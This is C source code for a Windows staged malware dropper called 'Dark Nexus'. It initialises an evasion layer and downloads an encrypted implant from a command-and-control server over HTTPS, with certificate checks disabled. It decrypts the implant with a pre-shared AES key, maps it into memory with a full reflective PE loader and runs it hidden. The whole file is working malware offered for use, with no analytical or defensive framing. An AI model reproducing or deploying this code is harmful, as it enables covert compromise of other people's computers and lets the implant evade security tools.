#include "staged.h"
#include "../config.h"
#include "../crypto/aes.h"
#include "../evasion/evasion.h"

#include <winhttp.h>

/*
 * Dark Nexus - Staged Payload Dropper
 *
 * Small binary (~15-20KB) that pulls the full implant from the C2.
 * The staging URI is the checkin URI with "/stage" appended.
 *
 * Flow:
 *   evasion init -> HTTPS fetch -> AES decrypt -> reflective PE load -> execute
 *
 * The reflective loader handles:
 *   - PE header parsing (DOS + NT headers, section table)
 *   - Memory allocation at preferred base or relocated
 *   - Section mapping with correct permissions
 *   - Base relocation fixups (delta patching)
 *   - Import table resolution (LoadLibrary + GetProcAddress)
 *   - TLS callback execution
 *   - Entry point invocation (DllMain or WinMain)
 */

// ============================================================
// HTTPS Fetch
// ============================================================

static BYTE* fetch_payload(DWORD* out_len) {
    *out_len = 0;

    // convert host to wide
    wchar_t wHost[256];
    MultiByteToWideChar(CP_UTF8, 0, DN_C2_HOST, -1, wHost, 256);

    // build stage URI: checkin URI + "/stage"
    char stage_uri[512];
    int slen = 0;
    const char* checkin = DN_C2_CHECKIN_URI;
    while (checkin[slen]) { stage_uri[slen] = checkin[slen]; slen++; }
    const char* suffix = "/stage";
    for (int i = 0; suffix[i]; i++) stage_uri[slen++] = suffix[i];
    stage_uri[slen] = '\0';

    wchar_t wURI[512];
    MultiByteToWideChar(CP_UTF8, 0, stage_uri, -1, wURI, 512);

    // WinHTTP session
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, wHost, DN_C2_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", wURI,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    // accept self-signed certs
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    // add build ID header for server-side payload selection
    wchar_t wBuildID[128];
    MultiByteToWideChar(CP_UTF8, 0, DN_BUILD_ID, -1, wBuildID, 128);
    wchar_t header[256];
    wsprintfW(header, L"X-Build-ID: %s", wBuildID);
    WinHttpAddRequestHeaders(hRequest, header, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    // send GET
    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!sent) goto fetch_fail;

    if (!WinHttpReceiveResponse(hRequest, NULL)) goto fetch_fail;

    // check HTTP status
    DWORD status_code = 0;
    DWORD status_size = sizeof(status_code);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status_code, &status_size,
                        WINHTTP_NO_HEADER_INDEX);
    if (status_code != 200) goto fetch_fail;

    // read response body
    DWORD total = 0;
    DWORD capacity = 65536;
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, capacity);
    if (!buf) goto fetch_fail;

    DWORD chunk = 0;
    DWORD bytes_read = 0;
    do {
        WinHttpQueryDataAvailable(hRequest, &chunk);
        if (chunk == 0) break;

        // grow buffer if needed
        if (total + chunk > capacity) {
            while (total + chunk > capacity) capacity *= 2;
            BYTE* new_buf = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, buf, capacity);
            if (!new_buf) {
                HeapFree(GetProcessHeap(), 0, buf);
                buf = NULL;
                goto fetch_fail;
            }
            buf = new_buf;
        }

        WinHttpReadData(hRequest, buf + total, chunk, &bytes_read);
        total += bytes_read;
    } while (chunk > 0);

    *out_len = total;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return buf;

fetch_fail:
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
}

// ============================================================
// Reflective PE Loader
// ============================================================

// PE structure offsets we need
#define PE_DOS_SIGNATURE      0x5A4D
#define PE_NT_SIGNATURE       0x00004550

typedef struct _DN_PE_RELOC_ENTRY {
    WORD offset : 12;
    WORD type   : 4;
} DN_PE_RELOC_ENTRY;

PVOID dn_reflective_load(const BYTE* pe_data, DWORD pe_size) {
    if (pe_size < sizeof(IMAGE_DOS_HEADER)) return NULL;

    // validate DOS header
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe_data;
    if (dos->e_magic != PE_DOS_SIGNATURE) return NULL;

    // validate NT headers
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > pe_size) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe_data + dos->e_lfanew);
    if (nt->Signature != PE_NT_SIGNATURE) return NULL;

    DWORD image_size = nt->OptionalHeader.SizeOfImage;
    ULONGLONG preferred_base = nt->OptionalHeader.ImageBase;

    // allocate memory for the image
    // try preferred base first, then let the OS choose
    PVOID base = NULL;
    SIZE_T alloc_size = image_size;

    NTSTATUS status = DnNtAllocateVirtualMemory(
        (HANDLE)-1, &base, 0, &alloc_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (status != 0) return NULL;

    // copy PE headers
    DWORD headers_size = nt->OptionalHeader.SizeOfHeaders;
    if (headers_size > pe_size) headers_size = pe_size;
    memcpy(base, pe_data, headers_size);

    // copy sections
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData == 0) continue;
        if (sections[i].PointerToRawData + sections[i].SizeOfRawData > pe_size) continue;

        BYTE* dest = (BYTE*)base + sections[i].VirtualAddress;
        memcpy(dest, pe_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
    }

    // process base relocations
    ULONGLONG delta = (ULONGLONG)base - preferred_base;
    if (delta != 0) {
        DWORD reloc_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD reloc_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

        if (reloc_rva && reloc_size) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)base + reloc_rva);
            DWORD processed = 0;

            while (processed < reloc_size && reloc->SizeOfBlock > 0) {
                DWORD entry_count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD j = 0; j < entry_count; j++) {
                    WORD type = entries[j] >> 12;
                    WORD offset = entries[j] & 0xFFF;

                    BYTE* patch_addr = (BYTE*)base + reloc->VirtualAddress + offset;

                    switch (type) {
                        case IMAGE_REL_BASED_DIR64:
                            *(ULONGLONG*)patch_addr += delta;
                            break;
                        case IMAGE_REL_BASED_HIGHLOW:
                            *(DWORD*)patch_addr += (DWORD)delta;
                            break;
                        case IMAGE_REL_BASED_HIGH:
                            *(WORD*)patch_addr += (WORD)(delta >> 16);
                            break;
                        case IMAGE_REL_BASED_LOW:
                            *(WORD*)patch_addr += (WORD)delta;
                            break;
                        case IMAGE_REL_BASED_ABSOLUTE:
                            break; // padding, skip
                    }
                }

                processed += reloc->SizeOfBlock;
                reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
    }

    // resolve imports
    DWORD import_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (import_rva) {
        PIMAGE_IMPORT_DESCRIPTOR imports = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)base + import_rva);

        while (imports->Name) {
            const char* dll_name = (const char*)((BYTE*)base + imports->Name);
            HMODULE hDll = LoadLibraryA(dll_name);
            if (!hDll) {
                imports++;
                continue;
            }

            // walk the thunk arrays
            PIMAGE_THUNK_DATA orig_thunk = NULL;
            PIMAGE_THUNK_DATA first_thunk = (PIMAGE_THUNK_DATA)((BYTE*)base + imports->FirstThunk);

            if (imports->OriginalFirstThunk) {
                orig_thunk = (PIMAGE_THUNK_DATA)((BYTE*)base + imports->OriginalFirstThunk);
            } else {
                orig_thunk = first_thunk;
            }

            while (orig_thunk->u1.AddressOfData) {
                FARPROC func = NULL;

                if (IMAGE_SNAP_BY_ORDINAL(orig_thunk->u1.Ordinal)) {
                    // import by ordinal
                    func = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(orig_thunk->u1.Ordinal));
                } else {
                    // import by name
                    PIMAGE_IMPORT_BY_NAME import_name =
                        (PIMAGE_IMPORT_BY_NAME)((BYTE*)base + orig_thunk->u1.AddressOfData);
                    func = GetProcAddress(hDll, import_name->Name);
                }

                first_thunk->u1.Function = (ULONGLONG)func;

                orig_thunk++;
                first_thunk++;
            }

            imports++;
        }
    }

    // set section protections
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD protect = PAGE_READONLY;
        DWORD chars = sections[i].Characteristics;

        BOOL exec  = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL read  = (chars & IMAGE_SCN_MEM_READ) != 0;
        BOOL write = (chars & IMAGE_SCN_MEM_WRITE) != 0;

        if (exec && write)      protect = PAGE_EXECUTE_READWRITE;
        else if (exec && read)  protect = PAGE_EXECUTE_READ;
        else if (exec)          protect = PAGE_EXECUTE;
        else if (write)         protect = PAGE_READWRITE;
        else if (read)          protect = PAGE_READONLY;

        PVOID section_base = (BYTE*)base + sections[i].VirtualAddress;
        SIZE_T section_size = sections[i].Misc.VirtualSize;
        if (section_size == 0) section_size = sections[i].SizeOfRawData;

        ULONG old_protect;
        DnNtProtectVirtualMemory((HANDLE)-1, &section_base, &section_size, protect, &old_protect);
    }

    // execute TLS callbacks if present
    DWORD tls_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (tls_rva) {
        PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((BYTE*)base + tls_rva);
        PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)tls_dir->AddressOfCallBacks;
        if (callbacks) {
            while (*callbacks) {
                (*callbacks)(base, DLL_PROCESS_ATTACH, NULL);
                callbacks++;
            }
        }
    }

    // update the NT headers in the mapped image to reflect actual base
    PIMAGE_NT_HEADERS mapped_nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    mapped_nt->OptionalHeader.ImageBase = (ULONGLONG)base;

    return base;
}

// ============================================================
// Stage and Execute
// ============================================================

BOOL dn_stage_and_execute(void) {
    // Step 1: initialize evasion layer
    DN_EVASION_STATUS evasion = dn_evasion_init();
    if (!evasion.syscalls_ready) {
        // syscalls are critical, can't proceed without them
        return FALSE;
    }

    // Step 2: fetch encrypted payload from C2
    DWORD enc_len = 0;
    BYTE* enc_payload = fetch_payload(&enc_len);
    if (!enc_payload || enc_len == 0) return FALSE;

    // Step 3: decrypt with PSK
    BYTE aes_key[32];
    dn_aes_init(aes_key, DN_PSK_HEX);

    DWORD pe_len = 0;
    BYTE* pe_data = dn_aes_decrypt(aes_key, enc_payload, enc_len, &pe_len);

    // zero and free encrypted payload
    SecureZeroMemory(enc_payload, enc_len);
    HeapFree(GetProcessHeap(), 0, enc_payload);

    // zero key
    SecureZeroMemory(aes_key, sizeof(aes_key));

    if (!pe_data || pe_len == 0) return FALSE;

    // Step 4: reflective-load the PE
    PVOID pe_base = dn_reflective_load(pe_data, pe_len);

    // zero and free raw PE
    SecureZeroMemory(pe_data, pe_len);
    HeapFree(GetProcessHeap(), 0, pe_data);

    if (!pe_base) return FALSE;

    // Step 5: find and call the entry point
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)pe_base + dos->e_lfanew);
    DWORD ep_rva = nt->OptionalHeader.AddressOfEntryPoint;

    if (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
        // DLL: call DllMain(base, DLL_PROCESS_ATTACH, NULL)
        typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);
        DllMainFunc entry = (DllMainFunc)((BYTE*)pe_base + ep_rva);
        entry((HINSTANCE)pe_base, DLL_PROCESS_ATTACH, NULL);
    } else {
        // EXE: call WinMain or start address directly
        typedef int (WINAPI *WinMainFunc)(HINSTANCE, HINSTANCE, LPSTR, int);
        WinMainFunc entry = (WinMainFunc)((BYTE*)pe_base + ep_rva);
        entry((HINSTANCE)pe_base, NULL, NULL, SW_HIDE);
    }

    return TRUE;
}

// ============================================================
// Staged Entry Point
// ============================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;

    dn_stage_and_execute();

    return 0;
}
